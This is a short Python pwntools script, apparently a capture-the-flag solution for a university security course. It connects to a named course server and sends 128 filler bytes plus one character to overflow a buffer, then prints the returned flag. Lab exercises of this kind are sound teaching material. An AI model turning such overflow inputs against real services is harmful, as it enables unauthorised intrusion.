import pwn

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23151

remote = pwn.remote(SERVER, PORT, timeout=10000)

buffer = "a" * 128 + "3"

remote.recvline()
remote.sendline(str.encode(buffer))
flag = remote.recvline_contains(b"Flag")
print(flag.decode().split()[1])